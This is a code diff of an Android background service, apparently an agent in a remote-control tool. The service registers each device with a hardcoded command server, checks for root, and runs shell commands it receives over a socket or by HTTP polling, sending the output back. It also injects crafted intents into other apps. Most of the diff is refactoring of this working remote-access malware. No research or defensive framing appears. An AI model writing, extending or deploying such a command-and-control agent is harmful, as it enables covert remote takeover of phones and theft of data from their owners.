@@ -8,28 +8,23 @@ import android.os.IBinder;
 import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
-
+import androidx.annotation.Nullable;
+import com.mobilemorph.agent.utils.*;
 import org.json.JSONObject;
-
+import org.json.JSONException;
 import java.util.Iterator;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
-import java.lang.module.ModuleDescriptor;
 import java.net.HttpURLConnection;
 import java.net.URL;
-// Include your custom utility classes if available
-
-import com.mobilemorph.agent.utils.*;
-
+import java.net.URISyntaxException;
 import io.socket.client.IO;
 import io.socket.client.Socket;
 
-import org.json.JSONObject;
-
 public class CommandService extends Service {
     private static final String TAG = "CommandService";
-    private static final String SERVER_URL = "http://127.0.0.1:5000"; // HTTPS support enabled
+    private static final String SERVER_URL = "http://172.21.159.82:5000"; // HTTPS support enabled
     private static boolean  isRunning = false;
     private static final int START_STICKY = 0;
     private String deviceId;
@@ -45,18 +40,16 @@ public class CommandService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "CommandService started");
-
         // Device ID must be fetched from context
-        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        deviceId = getDeviceId();
         registerWithServer();
-
         // Start WebSocket connection
         setupWebSocket(SERVER_URL, deviceId);
-
-        // Optionally keep polling logic here
-        // startPollingLoop();
-
         return START_STICKY;
+    }
+
+    private String getDeviceId() {
+        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
     }
 
     private boolean checkRootAccess() {
@@ -79,32 +72,37 @@ public class CommandService extends Service {
         try {
             Process process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
             BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            if (in.readLine() != null) return true;
+            if (in.readLine() != null) {
+                return true;
+            }
         } catch (Exception e) {
-            // Ignore errors here
+            // Ignore
         }
         return false;
     }
-
 
     private void setupWebSocket(String serverUrl, String deviceId) {
         try {
             mSocket = IO.socket(serverUrl);
             mSocket.on(Socket.EVENT_CONNECT, args -> {
                 Log.d("WS", "Connected");
-                JSONObject registration = new JSONObject();
-                registration.put("device_id", deviceId);
-                registration.put("manufacturer", Build.MANUFACTURER);
-                registration.put("model", Build.MODEL);
-                registration.put("rooted", checkRootAccess());
-                mSocket.emit("register", registration);
+                try {
+                    JSONObject registration = new JSONObject();
+                    registration.put("device_id", deviceId);
+                    registration.put("manufacturer", Build.MANUFACTURER);
+                    registration.put("model", Build.MODEL);
+                    registration.put("rooted", checkRootAccess());
+                    mSocket.emit("register", registration);
+                } catch (Exception e) {
+                    Log.e("WS", "Failed to build registration payload", e);
+                }
             });
             mSocket.on("command", args -> {
-                String cmd = (String) args[0];
-                Log.d("WS", "Received command: " + cmd);
-                String result = ShellExecutor.execute(cmd);
-                JSONObject response = new JSONObject();
                 try {
+                    String cmd = (String) args[0];
+                    Log.d("WS", "Received command: " + cmd);
+                    String result = ShellExecutor.execute(cmd);
+                    JSONObject response = new JSONObject();
                     response.put("device_id", deviceId);
                     response.put("output", result);
                     mSocket.emit("command_result", response);
@@ -114,7 +112,7 @@ public class CommandService extends Service {
             });
             mSocket.connect();
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e(TAG, "WebSocket setup failed", e);
         }
     }
 
@@ -122,6 +120,7 @@ public class CommandService extends Service {
         try {
             // Avoid re-registration
             SharedPreferences prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE);
+            if (prefs.getBoolean("registered", false)) return;
             JSONObject payload = new JSONObject();
             payload.put("device_id", deviceId);
             payload.put("manufacturer", Build.MANUFACTURER);
@@ -196,14 +195,12 @@ public class CommandService extends Service {
             URL url = new URL(SERVER_URL + "/get_command/" + deviceId);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
-
             BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             StringBuilder response = new StringBuilder();
             String line;
             while ((line = reader.readLine()) != null) {
                 response.append(line);
             }
-
             return new JSONObject(response.toString());
         } catch (Exception e) {
             Log.e(TAG, "fetchCommand() failed", e);
@@ -218,16 +215,13 @@ public class CommandService extends Service {
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json");
             conn.setDoOutput(true);
-
             JSONObject payload = new JSONObject();
             payload.put("device_id", deviceId);
             payload.put("output", output);
-
             OutputStream os = conn.getOutputStream();
             os.write(payload.toString().getBytes());
             os.flush();
             os.close();
-
             conn.getResponseCode();
         } catch (Exception e) {
             Log.e(TAG, "postOutput() failed", e);
@@ -239,7 +233,6 @@ public class CommandService extends Service {
             String pkg = args.getString("package");
             String component = args.optString("component", pkg + ".MyReceiver");
             String action = args.optString("action", "android.intent.action.SEND");
-
             JSONObject extras = args.optJSONObject("extras");
             Intent intent = new Intent(action);
             intent.setComponent(new ComponentName(pkg, pkg + component));
@@ -260,17 +253,10 @@ public class CommandService extends Service {
             }
 
             getApplicationContext().sendBroadcast(intent);
-            sendResult("Intent injection sent to: " + pkg + component);
+            sendResult("Intent injection sent to: " + pkg + " -> " + component);
         } catch (Exception e) {
             sendResult("Error during intent injection: " + e.getMessage());
         }
-    }
-
-    private String getDeviceId() {
-        return android.provider.Settings.Secure.getString(
-            getApplicationContext().getContentResolver(),
-            android.provider.Settings.Secure.ANDROID_ID
-        );
     }
 
     private void sendResult(String message) {
@@ -278,7 +264,9 @@ public class CommandService extends Service {
 		    JSONObject result = new JSONObject();
 		    result.put("device_id", getDeviceId());
 		    result.put("result", message);
-		    mSocket.emit("command_result", result);
+            if (mSocket != null) {
+                mSocket.emit("command_result", result);
+            }
 	    } catch (Exception e) {
 		    e.printStackTrace();
 	    }
@@ -291,6 +279,7 @@ public class CommandService extends Service {
         Log.d(TAG, "CommandService stopped.");
     }
 
+    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
